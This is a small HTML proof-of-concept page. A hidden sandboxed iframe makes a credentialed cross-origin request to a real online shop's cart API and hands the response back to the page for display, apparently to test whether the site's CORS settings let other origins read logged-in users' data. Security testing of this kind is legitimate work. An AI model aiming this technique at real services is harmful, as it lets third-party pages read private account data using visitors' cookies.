<!DOCTYPE html>
<html>
<body>

<button onclick="run()">Run</button>

<pre id="out"></pre>

<iframe id="f" sandbox="allow-scripts" style="display:none"></iframe>

<script>

function run(){

let code = `
<script>

fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
method:"GET",
credentials:"include"
})
.then(r=>r.text())
.then(t=>{
parent.postMessage(t,"*")
})
.catch(e=>{
parent.postMessage(e.toString(),"*")
})

<\/script>
`

document.getElementById("f").srcdoc = code

}

window.addEventListener("message",e=>{
document.getElementById("out").textContent = e.data
})

</script>

</body>
</html>
